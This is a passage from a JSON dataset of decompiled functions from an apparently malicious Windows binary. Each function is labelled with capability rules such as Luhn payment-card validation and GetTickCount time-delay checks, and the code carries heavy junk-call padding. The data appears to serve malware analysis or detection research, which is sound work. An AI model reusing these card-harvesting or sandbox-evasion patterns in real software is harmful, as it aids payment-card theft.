if (0xf < var_34h) {\n        fcn.0042a679(var_48h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(unaff_ESI);\n    return;\n}\n",
        "token_count": 1633
    },
    "00410590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_154h_4\n// WARNING: Variable defined which should be unmapped: var_14dh_5\n// WARNING: Variable defined which should be unmapped: var_15ch_2\n// WARNING: Variable defined which should be unmapped: var_130h_3\n// WARNING: Variable defined which should be unmapped: var_158h_2\n// WARNING: Variable defined which should be unmapped: var_14dh_3\n// WARNING: Variable defined which should be unmapped: var_130h_4\n// WARNING: Variable defined which should be unmapped: var_154h_3\n// WARNING: Variable defined which should be unmapped: var_158h\n// WARNING: Variable defined which should be unmapped: var_138h\n// WARNING: Variable defined which should be unmapped: var_14dh_2\n// WARNING: Variable defined which should be unmapped: var_114h_3\n// WARNING: Variable defined which should be unmapped: var_11ch_2\n// WARNING: Variable defined which should be unmapped: var_154h\n// WARNING: Variable defined which should be unmapped: var_14dh\n// WARNING: Variable defined which should be unmapped: var_114h_5\n// WARNING: Variable defined which should be unmapped: var_114h_2\n// WARNING: Variable defined which should be unmapped: var_11ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410590(void)\n\n{\n    uint32_t noname_21;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint var_4h_3;\n    uint var_4h_2;\n    uint var_4h_5;\n    uint var_10h_2;\n    uint var_ch_2;\n    uint var_4h;\n    uint var_15ch;\n    uint var_114h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t in_stack_fffffdf8;\n    uint in_stack_fffffdfc;\n    uint in_stack_fffffe00;\n    uint in_stack_fffffe04;\n    uint uVar3;\n    uint uVar4;\n    uint noname_8;\n    uint uVar5;\n    uint noname_9;\n    uchar *in_stack_fffffe14;\n    uint in_stack_fffffe18;\n    uint32_t in_stack_fffffe1c;\n    int32_t in_stack_fffffe20;\n    uint uVar6;\n    uint *arg_8h;\n    uint uVar7;\n    uchar *puVar8;\n    uint in_stack_fffffe2c;\n    uchar *in_stack_fffffe30;\n    uint in_stack_fffffe34;\n    uint32_t noname_12;\n    uchar *puVar9;\n    uint *arg_8h_00;\n    uchar *in_stack_fffffe48;\n    uint uVar10;\n    uint in_stack_fffffe4c;\n    uint in_stack_fffffe50;\n    uchar *in_stack_fffffe54;\n    uint in_stack_fffffe58;\n    uint in_stack_fffffe5c;\n    uint noname_9_00;\n    uchar *noname_10;\n    uint in_stack_fffffe68;\n    uint in_stack_fffffe6c;\n    uint in_stack_fffffe70;\n    uint uVar11;\n    uint in_stack_fffffe74;\n    uint in_stack_fffffe78;\n    uint in_stack_fffffe7c;\n    uint uVar12;\n    uint noname_18;\n    uchar *noname_19;\n    uint var_154h_4;\n    uint var_14dh_5;\n    uchar *puVar13;\n    uchar *in_stack_fffffea4;\n    uint var_15ch_2;\n    uint in_stack_fffffeac;\n    uint var_130h_3;\n    uint in_stack_fffffeb4;\n    uint in_stack_fffffeb8;\n    uint var_158h_2;\n    uint in_stack_fffffec0;\n    uchar auStack316 [3];\n    uint var_14dh_3;\n    uint var_130h_4;\n    uint var_154h_3;\n    uint in_stack_fffffed4;\n    uint var_158h;\n    uint var_138h;\n    uchar var_154h_2 [3];\n    uint var_14dh_2;\n    uint in_stack_fffffee8;\n    uint in_stack_fffffeec;\n    uint var_114h_3;\n    uint in_stack_fffffef4;\n    uint var_11ch_2;\n    uint var_154h;\n    uchar var_130h [3];\n    uint var_14dh;\n    uint in_stack_ffffff08;\n    uint var_114h_5;\n    uint var_114h_2;\n    uint var_11ch;\n    uint in_stack_ffffff18;\n    uint in_stack_ffffff1c;\n    uint in_stack_ffffff20;\n    uint in_stack_ffffff24;\n    uint var_114h_4;\n    uint var_4h_4;\n    int32_t iStack16;\n    uint uStack12;\n    uint var_4h_6;\n    \n    var_4h_6 = 0xffffffff;\n    uStack12 = 0x43de6e;\n    iStack16 = *in_FS_OFFSET;\n    noname_21 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    uVar12 = 0x4105d1;\n    fcn.0042a6e0();\n    noname_19 = &stack0xfffffee8;\n    (**0x463038)();\n    do {\n        noname_18 = 0x4470c0;\n        puVar9 = &stack0xfffffe68;\n        noname_10 = &stack0xfffffe68;\n        noname_9_00 = 0x41060c;\n        fcn.0040bef0(&stack0xfffffe68);\n        puVar8 = &stack0xfffffe48;\n        var_4h_6 = 2;\n        fcn.0040bff0(&stack0xfffffe48);\n        arg_8h_00 = &fcn.00410590::var_130h_4;\n        var_4h_6._0_1_ = 3;\n        iVar1 = fcn.0040bff0(arg_8h_00);\n        iVar1 = *(iVar1 + 0x10) + 1;\n        var_4h_6 = CONCAT31(var_4h_6._1_3_, 5);\n        noname_12 = 0x410652;\n        fcn.0040fdf0(iVar1, arg_8h_00, puVar8, in_stack_fffffe48, in_stack_fffffe4c, in_stack_fffffe50, \n                     in_stack_fffffe54, in_stack_fffffe58, in_stack_fffffe5c, noname_9_00, noname_10, in_stack_fffffe68\n                     , in_stack_fffffe6c, in_stack_fffffe70, in_stack_fffffe74, in_stack_fffffe78, in_stack_fffffe7c, \n                     uVar12, noname_18, noname_19, 0x446ee4, noname_21, unaff_EDI, unaff_ESI, unaff_EBX, puVar9, \n                     in_stack_fffffea4, &stack0xfffffe48, in_stack_fffffeac, var_130h_3, in_stack_fffffeb4, \n                     in_stack_fffffeb8, var_158h_2, in_stack_fffffec0, _auStack316, stack0xfffffec8, var_130h_4, \n                     var_154h_3, in_stack_fffffed4, var_158h, var_138h, _var_154h_2, stack0xfffffee4, in_stack_fffffee8\n                     , in_stack_fffffeec, var_114h_3, in_stack_fffffef4, var_11ch_2, var_154h, _var_130h, \n                     stack0xffffff04, in_stack_ffffff08, var_114h_5, var_114h_2, var_11ch, in_stack_ffffff18, \n                     in_stack_ffffff1c, in_stack_ffffff20, in_stack_ffffff24);\n        var_4h_6 = 0xffffffff;\n        if (0xf < _var_154h_2) {\n            fcn.0042a679();\n        }\n        in_stack_fffffe74 = *0x450040;\n        if (*0x450054 < 0x10) {\n            in_stack_fffffe74 = 0x450040;\n        }\n        in_stack_fffffe78 = 0x447038;\n        uVar11 = 0x41068d;\n        iVar2 = (**0x463068)();\n        if (iVar2 != 0) {\n            in_stack_fffffe54 = &stack0xfffffe58;\n            in_stack_fffffe50 = 0x4106ac;\n            fcn.0040bf70(&stack0xfffffe58);\n            puVar9 = &stack0xfffffe38;\n            in_stack_fffffe4c = 0xf;\n            uVar10 = 0;\n            var_4h_6 = 6;\n            noname_12 = noname_12 & 0xffffff00;\n            in_stack_fffffe34 = fcn.0042ad20();\n            in_stack_fffffe30 = &stack0xfffffee8;\n            in_stack_fffffe2c = 0x4106ed;\n            fcn.004062a0(in_stack_fffffe30, in_stack_fffffe34);\n            puVar13 = &stack0xfffffe14;\n            uVar5 = 0xffffffff;\n            uVar4 = 0;\n            uVar7 = 0xf;\n            uVar6 = 0;\n            uVar3 = 0x450040;\n            var_4h_6 = CONCAT31(var_4h_6._1_3_, 7);\n            in_stack_fffffe14 = in_stack_fffffe14 & 0xffffff00;\n            fcn.004061b0(0x450040, 0, 0xffffffff);\n            var_4h_6 = 0xffffffff;\n            in_stack_fffffe04 = 0x410722;\n            fcn.0040ffe0(uVar3, uVar4, uVar5, in_stack_fffffe14, in_stack_fffffe18, in_stack_fffffe1c, in_stack_fffffe20\n                         , uVar6, uVar7, in_stack_fffffe2c, in_stack_fffffe30, in_stack_fffffe34, noname_12, iVar1, \n                         arg_8h_00, puVar8, uVar10, in_stack_fffffe4c, in_stack_fffffe50, in_stack_fffffe54, \n                         in_stack_fffffe58, in_stack_fffffe5c, noname_9_00, noname_10, in_stack_fffffe68, \n                         in_stack_fffffe6c, uVar11, in_stack_fffffe74, in_stack_fffffe78, in_stack_fffffe7c, uVar12, \n                         noname_18, noname_19, 0x446ee4, noname_21, unaff_EDI, unaff_ESI, unaff_EBX, puVar9, puVar13, \n                         &stack0xfffffe58, in_stack_fffffeac, var_130h_3, in_stack_fffffeb4, in_stack_fffffeb8, \n                         var_158h_2, in_stack_fffffec0, _auStack316, stack0xfffffec8, var_130h_4);\n        }\n        in_stack_fffffe6c = *0x450040;\n        if (*0x450054 < 0x10) {\n            in_stack_fffffe6c = 0x450040;\n        }\n        in_stack_fffffe70 = 0x447038;\n        iVar2 = (**0x463068)();\n        if (iVar2 != 0) {\n            uVar12 = fcn.0040bf30(&fcn.00410590::var_130h_4);\n            var_4h_6 = 0x10;\n            fcn.004063e0(uVar12);\n            var_4h_6 = 0xffffffff;\n            if (0xf < _var_154h_2) {\n                fcn.0042a679();\n            }\n            uVar12 = fcn.0040bf70(&fcn.00410590::var_130h_4);\n            var_4h_6 = 0x11;\ncode_r0x00410cf6:\n            fcn.004063e0(uVar12);\njoined_r0x00410c9e:\n            if (_var_154h_2 < 0x10) goto code_r0x00410d18;\n            goto code_r0x00410d10;\n        }\n        uVar3 = 0x4470c0;\n        in_stack_fffffea4 = &stack0xfffffe4c;\n        in_stack_fffffe48 = &stack0xfffffe4c;\n        uVar11 = 0x410767;\n        fcn.0040bfb0(&stack0xfffffe4c);\n        puVar8 = &stack0xfffffe2c;\n        var_4h_6 = 10;\n        fcn.0040bff0(&stack0xfffffe2c);\n        arg_8h = &fcn.00410590::var_130h_4;\n        var_4h_6._0_1_ = 0xb;\n        iVar2 = fcn.0040bff0(arg_8h);\n        in_stack_fffffe20 = *(iVar2 + 0x10) + 1;\n        var_4h_6 = CONCAT31(var_4h_6._1_3_, 0xd);\n        in_stack_fffffe1c = 0x4107ad;\n        fcn.0040fdf0(in_stack_fffffe20, arg_8h, puVar8, in_stack_fffffe2c, in_stack_fffffe30, in_stack_fffffe34, \n                     noname_12, iVar1, arg_8h_00, uVar11, in_stack_fffffe48, in_stack_fffffe4c, in_stack_fffffe50, \n                     in_stack_fffffe54, in_stack_fffffe58, in_stack_fffffe5c, noname_9_00, noname_10, uVar3, \n                     in_stack_fffffe6c, in_stack_fffffe70, in_stack_fffffe74, in_stack_fffffe78, in_stack_fffffe7c, \n                     uVar12, noname_18, noname_19, 0x446ee4, noname_21, unaff_EDI, unaff_ESI, unaff_EBX, puVar9, \n                     in_stack_fffffea4, &stack0xfffffe2c, in_stack_fffffeac, var_130h_3, in_stack_fffffeb4, \n                     in_stack_fffffeb8, var_158h_2, in_stack_fffffec0, _auStack316, stack0xfffffec8, var_130h_4, \n                     var_154h_3, in_stack_fffffed4, var_158h, var_138h, _var_154h_2, stack0xfffffee4, in_stack_fffffee8\n                     , in_stack_fffffeec, var_114h_3, in_stack_fffffef4, var_11ch_2, var_154h, _var_130h, \n                     stack0xffffff04, in_stack_ffffff08);\n        var_4h_6 = 0xffffffff;\n        if (0xf < _var_154h_2) {\n            fcn.0042a679();\n        }\n        in_stack_fffffe58 = *0x450040;\n        if (*0x450054 < 0x10) {\n            in_stack_fffffe58 = 0x450040;\n        }\n        in_stack_fffffe5c = 0x447038;\n        uVar4 = 0x4107e8;\n        iVar2 = (**0x463068)();\n        if (iVar2 != 0) {\n            in_stack_fffffea4 = &stack0xfffffe3c;\n            puVar9 = &stack0xfffffe3c;\n            in_stack_fffffe34 = 0x410807;\n            fcn.0040bf70(&stack0xfffffe3c);\n            in_stack_fffffe30 = 0xf;\n            in_stack_fffffe2c = 0;\n            var_4h_6 = 0xe;\n            in_stack_fffffe1c = in_stack_fffffe1c & 0xffffff00;\n            in_stack_fffffe18 = fcn.0042ad20();\n            in_stack_fffffe14 = &stack0xfffffee8;\n            noname_9 = 0x410848;\n            fcn.004062a0(in_stack_fffffe14, in_stack_fffffe18);\n            puVar13 = &stack0xfffffdf8;\n            uVar7 = 0xffffffff;\n            uVar6 = 0;\n            noname_8 = 0xf;\n            uVar10 = 0;\n            uVar5 = 0x450040;\n            var_4h_6 = CONCAT31(var_4h_6._1_3_, 0xf);\n            in_stack_fffffdf8 = in_stack_fffffdf8 & 0xffffff00;\n            fcn.004061b0(0x450040, 0, 0xffffffff);\n            var_4h_6 = 0xffffffff;\n            fcn.0040ffe0(uVar5, uVar6, uVar7, in_stack_fffffdf8, in_stack_fffffdfc, in_stack_fffffe00, in_stack_fffffe04\n                         , uVar10, noname_8, noname_9, in_stack_fffffe14, in_stack_fffffe18, in_stack_fffffe1c, \n                         in_stack_fffffe20, arg_8h, puVar8, in_stack_fffffe2c, in_stack_fffffe30, in_stack_fffffe34, \n                         puVar9, iVar1, arg_8h_00, uVar11, in_stack_fffffe48, in_stack_fffffe4c, in_stack_fffffe50, \n                         uVar4, in_stack_fffffe58, in_stack_fffffe5c, noname_9_00, noname_10, uVar3, in_stack_fffffe6c, \n                         in_stack_fffffe70, in_stack_fffffe74, in_stack_fffffe78, in_stack_fffffe7c, uVar12, noname_18, \n                         noname_19, 0x446ee4, noname_21, unaff_EDI, unaff_ESI, unaff_EBX, puVar13, in_stack_fffffea4, \n                         &stack0xfffffe1c, in_stack_fffffeac, var_130h_3);\n        }\n        in_stack_fffffe50 = *0x450040;\n        if (*0x450054 < 0x10) {\n            in_stack_fffffe50 = 0x450040;\n        }\n        in_stack_fffffe54 = 0x447038;\n        in_stack_fffffe4c = 0x41089e;\n        iVar1 = (**0x463068)();\n        if (iVar1 != 0) {\n            uVar12 = fcn.0040bf30(&fcn.00410590::var_130h_4);\n            var_4h_6 = 0x1a;\n            fcn.004063e0(uVar12);\n            var_4h_6 = 0xffffffff;\n            if (0xf < _var_154h_2) {\n                fcn.0042a679();\n            }\n            uVar12 = fcn.0040bf70(&fcn.00410590::var_130h_4);\n            var_4h_6 = 0x1b;\n            fcn.004063e0(uVar12);\n            goto joined_r0x00410c9e;\n        }\n        iVar1 = (**0x463068)();\n        if (iVar1 != 0) {\n            uVar12 = fcn.0040c030(&fcn.00410590::var_130h_4);\n            var_4h_6 = 0x24;\n            fcn.004063e0(uVar12);\n            var_4h_6 = 0xffffffff;\n            if (0xf < _var_154h_2) {\n                fcn.0042a679();\n            }\n            uVar12 = fcn.0040c070(&fcn.00410590::var_130h_4);\n            var_4h_6 = 0x25;\n            fcn.004063e0(uVar12);\n            goto joined_r0x00410c9e;\n        }\n        iVar1 = (**0x463068)();\n        if (iVar1 != 0) {\n            uVar12 = fcn.0040c030(&fcn.00410590::var_130h_4);\n            var_4h_6 = 0x2e;\n            fcn.004063e0(uVar12);\n            var_4h_6 = 0xffffffff;\n            if (0xf < _var_154h_2) {\n                fcn.0042a679();\n            }\n            uVar12 = fcn.0040c070(&fcn.00410590::var_130h_4);\n            var_4h_6 = 0x2f;\n            goto code_r0x00410cf6;\n        }\n        iVar1 = (**0x463068)();\n        if (iVar1 != 0) {\n            uVar12 = fcn.0040c070(&fcn.00410590::var_130h_4);\n            var_4h_6 = 0x38;\n            fcn.004063e0(uVar12);\n            var_4h_6 = 0xffffffff;\n            if (0xf < _var_154h_2) {\n                fcn.0042a679();\n            }\n            uVar12 = fcn.0040c070(&fcn.00410590::var_130h_4);\n            var_4h_6 = 0x39;\n            fcn.004063e0(uVar12);\n            goto joined_r0x00410c9e;\n        }\n        iVar1 = (**0x463068)();\n        if (iVar1 != 0) {\n            uVar12 = fcn.0040c070(&fcn.00410590::var_130h_4);\n            var_4h_6 = 0x42;\n            fcn.004063e0(uVar12);\n            var_4h_6 = 0xffffffff;\n            if (0xf < _var_154h_2) {\n                fcn.0042a679();\n            }\n            uVar12 = fcn.0040c070(&fcn.00410590::var_130h_4);\n            var_4h_6 = 0x43;\n            fcn.004063e0(uVar12);\n            goto joined_r0x00410c9e;\n        }\n        iVar1 = (**0x463068)();\n        if (iVar1 != 0) {\n            uVar12 = fcn.0040c070(&fcn.00410590::var_130h_4);\n            var_4h_6 = 0x4c;\n            fcn.004063e0(uVar12);\n            var_4h_6 = 0xffffffff;\n            if (0xf < _var_154h_2) {\n                fcn.0042a679();\n            }\n            uVar12 = fcn.0040c070(&fcn.00410590::var_130h_4);\n            var_4h_6 = 0x4d;\n            goto code_r0x00410cf6;\n        }\n        iVar1 = (**0x463068)();\n        if (iVar1 != 0) {\n            uVar12 = fcn.0040c070(&fcn.00410590::var_130h_4);\n            var_4h_6 = 0x4e;\n            fcn.004063e0(uVar12);\n            var_4h_6 = 0xffffffff;\n            if (0xf < _var_154h_2) {\n                fcn.0042a679();\n            }\n            uVar12 = fcn.0040c070(&fcn.00410590::var_130h_3);\n            var_4h_6 = 0x4f;\n            fcn.004063e0(uVar12);\n            if (0xf < _auStack316) {\ncode_r0x00410d10:\n                fcn.0042a679();\n            }\ncode_r0x00410d18:\n            *in_FS_OFFSET = iStack16;\n            fcn.0042a75a(in_stack_fffffe6c);\n            return;\n        }\n        in_stack_fffffe68 = 60000;\n        (**0x462ea8)();\n    } while( true );\n}\n",
        "token_count": 5710
    },
    "00410d40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00410f78) overlaps instruction at (ram,0x00410f77)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410d40(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *arg_8h;\n    int32_t extraout_EDX;\n    int32_t *in_FS_OFFSET;\n    uchar uVar4;\n    ulong uVar5;\n    uint var_a50h;\n    uint var_a2eh;\n    uint var_8e4h;\n    uint var_8d4h;\n    uint var_8d0h;\n    uint var_86ch;\n    uint var_858h;\n    uint var_7e0h;\n    uint var_3f8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint uVar6;\n    uint uVar7;\n    uint noname_3;\n    uint32_t in_stack_fffff460;\n    uint in_stack_fffff464;\n    uint in_stack_fffff468;\n    uint var_a77h;\n    uint var_a58h;\n    uint var_a54h;\n    uint var_a50h_2;\n    uint var_a4ch;\n    uint var_a48h;\n    uint var_a44h;\n    uint var_a40h;\n    uint var_a3ch;\n    char var_a35h;\n    int32_t var_a34h;\n    uint var_a2ch;\n    uint var_904h;\n    uint32_t var_900h;\n    uint var_8f0h;\n    uint32_t var_8ech;\n    uint32_t var_8e4h_2;\n    uint uStack2264;\n    uint32_t var_8d0h_2;\n    uint32_t var_8c0h;\n    uint var_8b0h;\n    uint32_t var_8ach;\n    uint32_t var_8a4h;\n    uint var_894h;\n    uint32_t var_890h;\n    uint32_t var_888h;\n    uint var_878h;\n    uint32_t var_874h;\n    uint32_t var_86ch_2;\n    uint var_85ch;\n    uint32_t var_858h_2;\n    uint32_t var_850h;\n    uint var_840h;\n    uint32_t var_83ch;\n    uint32_t var_834h;\n    uint var_824h;\n    uint32_t var_820h;\n    uint32_t var_818h;\n    uint var_808h;\n    uint32_t var_804h;\n    uint32_t var_7fch;\n    uint var_7ech;\n    uint32_t var_7e8h;\n    uint var_7e0h_2;\n    uint var_3f8h_2;\n    uint32_t var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint32_t var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x43df7c;\n    var_ch_2 = *in_FS_OFFSET;\n    var_10h_2 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch_2;\n    pcVar1 = *0x440014;\n    (**0x440014)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    var_8d0h_2 = 0xf;\n    uStack2264 = 0;\n    var_8e4h_2 = var_8e4h_2 & 0xffffff00;\n    var_4h_2 = 0;\n    fcn.00402100();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.00424820();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    *0x452478 = 44000;\n    *0x452484 = 0;\n    *0x452470 = 0;\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.0042a6e0();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.0041fcd0(&var_86ch_2);\n    var_4h_2._0_1_ = 1;\n    (**0x463038)();\n    var_4h_2._0_1_ = 0;\n    if (0xf < var_858h_2) {\n        fcn.0042a679();\n    }\n    fcn.0041f930(&var_86ch_2);\n    var_4h_2._0_1_ = 2;\n    (**0x463038)();\n    var_4h_2._0_1_ = 0;\n    if (0xf < var_858h_2) {\n        fcn.0042a679();\n    }\n    fcn.0041f870(&var_86ch_2);\n    var_4h_2._0_1_ = 3;\n    (**0x463038)();\n    var_4h_2 = var_4h_2._1_3_ << 8;\n    if (0xf < var_858h_2) {\n        fcn.0042a679();\n    }\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    *0x452480 = (**0x462e98)();\n    while (uVar4 = *0x452480 == 0,  !uVar4) {\n        (**0x462ed0)();\n        (**0x462ea8)();\n        *0x452480 = (**0x462e98)();\n    }\n    *0x452480 = (**0x463020)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar4) && (uVar4)) {\n    // WARNING: Could not recover jumptable at 0x00410f7c. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX + 1))();\n        return;\n    }\n    fcn.00410590();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    *0x45247c = fcn.004284d0(0, 0x54c5638, 0);\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.0042a6e0();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    noname_3 = 0xffffffff;\n    uVar7 = 0;\n    uVar6 = 0x450078;\n    in_stack_fffff460 = in_stack_fffff460 & 0xffffff00;\n    fcn.004061b0(0x450078, 0, 0xffffffff);\n    uVar5 = fcn.00414890(&var_7e0h_2, uVar6, uVar7, noname_3, in_stack_fffff460, in_stack_fffff464, in_stack_fffff468);\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    *0x45246c = fcn.0040ac90(uVar5, uVar5 >> 0x20, 0x4452bc);\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    var_a34h = 0;\n    fcn.00408c20(*0x45246c, *0x452234, 1, &var_a34h, &var_a2ch);\n    uVar6 = (**0x463094)(0, var_904h);\n    uVar6 = (**0x46301c)(uVar6);\n    fcn.0040afc0(*0x45246c, var_a34h, uVar6, var_904h);\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    fcn.0041e0c0(uVar6, var_904h);\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    if (*0x4524c0 != '\\0') {\n        fcn.0040b770();\n    }\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    if (*0x4524c4 != 0) {\n        fcn.0040ce20();\n    }\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    fcn.0040de40(*0x45247c);\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    if (*0x4524be != '\\0') {\n        fcn.00413330(*0x45247c);\n    }\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    fcn.0040ed30(*0x452468, *0x45247c);\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    if (*0x4524c3 != '\\0') {\n        fcn.00420b50(0x46, *0x45247c);\n    }\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    fcn.00429a60(*0x45247c, &var_a40h, &var_a44h);\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    var_a3ch = 0;\n    var_a34h = 0;\n    fcn.0040b580(&var_a34h, &var_a3ch, var_a40h, var_a44h);\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    var_a4ch = var_a34h;\n    var_a48h = var_a3ch;\n    (**0x463070)(0, 0, fcn.0040cec0, &var_a4ch, 0, 0);\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    uVar6 = 7;\n    (*pcVar1)();\n    var_a34h = 0;\n    while (*0x4524cc == 0) {\n        if (*0x4524d0 != 0) goto code_r0x004113a7;\n        if (var_a34h == 0x3c) {\n            (**0x463070)(0, 0, fcn.0040cec0, &var_a4ch, 0, 0);\n            var_a34h = 0;\n        }\n        (**0x462ea8)(1000);\n        var_a34h = var_a34h + 1;\n    }\n    do {\n        (**0x462ea8)(1000);\n    } while (*0x4524d4 == 0);\ncode_r0x004113a7:\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    iVar3 = fcn.00401c90();\n    if ((iVar3 == 0) && (*0x452470 != 0)) {\n        var_83ch = 0xf;\n        var_840h = 0;\n        var_850h = var_850h & 0xffffff00;\n        uVar7 = fcn.0042ad20(0x4470ec);\n        fcn.004062a0(0x4470ec, uVar7);\n        var_4h_2._0_1_ = 4;\n        var_804h = 0xf;\n        var_808h = 0;\n        var_818h = var_818h & 0xffffff00;\n        uVar7 = fcn.0042ad20(0x4470e4);\n        fcn.004062a0(0x4470e4, uVar7);\n        var_4h_2._0_1_ = 5;\n        var_7e8h = 0xf;\n        var_7ech = 0;\n        var_7fch = var_7fch & 0xffffff00;\n        uVar7 = fcn.0042ad20(0x4470dc);\n        fcn.004062a0(0x4470dc, uVar7);\n        var_4h_2._0_1_ = 6;\n        var_820h = 0xf;\n        var_824h = 0;\n        var_834h = var_834h & 0xffffff00;\n        uVar7 = fcn.0042ad20(0x4470d4);\n        fcn.004062a0(0x4470d4, uVar7);\n        var_4h_2._0_1_ = 7;\n        uVar7 = fcn.004064e0(&var_8c0h, &var_834h, &var_7fch);\n        var_4h_2._0_1_ = 8;\n        uVar7 = fcn.004064e0(&var_8a4h, uVar7, &var_818h);\n        var_4h_2._0_1_ = 9;\n        arg_8h = fcn.004064e0(&var_888h, uVar7, &var_850h);\n        var_4h_2 = CONCAT31(var_4h_2._1_3_, 10);\n        if (0xf < arg_8h[5]) {\n            arg_8h = *arg_8h;\n        }\n        cVar2 = fcn.00420cf0(arg_8h);\n        var_a35h = cVar2 == '\\0';\n        if (0xf < var_874h) {\n            fcn.0042a679(var_888h);\n        }\n        var_874h = 0xf;\n        var_878h = 0;\n        var_888h = var_888h & 0xffffff00;\n        if (0xf < var_890h) {\n            fcn.0042a679(var_8a4h);\n        }\n        var_890h = 0xf;\n        var_894h = 0;\n        var_8a4h = var_8a4h & 0xffffff00;\n        if (0xf < var_8ach) {\n            fcn.0042a679(var_8c0h);\n        }\n        var_8ach = 0xf;\n        var_8b0h = 0;\n        var_8c0h = var_8c0h & 0xffffff00;\n        if (0xf < var_820h) {\n            fcn.0042a679(var_834h);\n        }\n        var_820h = 0xf;\n        var_824h = 0;\n        var_834h = var_834h & 0xffffff00;\n        if (0xf < var_7e8h) {\n            fcn.0042a679(var_7fch);\n        }\n        var_7e8h = 0xf;\n        var_7ech = 0;\n        var_7fch = var_7fch & 0xffffff00;\n        if (0xf < var_804h) {\n            fcn.0042a679(var_818h);\n        }\n        var_804h = 0xf;\n        var_808h = 0;\n        var_818h = var_818h & 0xffffff00;\n        var_4h_2 = var_4h_2 & 0xffffff00;\n        if (0xf < var_83ch) {\n            fcn.0042a679(var_850h);\n        }\n        if (var_a35h != '\\0') {\n            var_874h = 0xf;\n            var_878h = 0;\n            var_888h = var_888h & 0xffffff00;\n            uVar7 = fcn.0042ad20(0x4470d0);\n            fcn.004062a0(0x4470d0, uVar7);\n            var_4h_2._0_1_ = 0xb;\n            var_83ch = 0xf;\n            var_840h = 0;\n            var_850h = var_850h & 0xffffff00;\n            uVar7 = fcn.0042ad20(0x446d4c);\n            fcn.004062a0(0x446d4c, uVar7);\n            var_4h_2._0_1_ = 0xc;\n            var_820h = 0xf;\n            var_824h = 0;\n            var_834h = var_834h & 0xffffff00;\n            uVar7 = fcn.0042ad20(0x4470c8);\n            fcn.004062a0(0x4470c8, uVar7);\n            var_4h_2._0_1_ = 0xd;\n            var_7e8h = 0xf;\n            var_7ech = 0;\n            var_7fch = var_7fch & 0xffffff00;\n            uVar7 = fcn.0042ad20(0x446d4c);\n            fcn.004062a0(0x446d4c, uVar7);\n            var_4h_2._0_1_ = 0xe;\n            var_804h = 0xf;\n            var_808h = 0;\n            var_818h = var_818h & 0xffffff00;\n            uVar7 = fcn.0042ad20(0x4470c4);\n            fcn.004062a0(0x4470c4, uVar7);\n            var_4h_2._0_1_ = 0xf;\n            uVar7 = fcn.004064e0(&var_86ch_2, &var_818h, &var_7fch);\n            var_4h_2._0_1_ = 0x10;\n            uVar7 = fcn.004064e0(&var_900h, 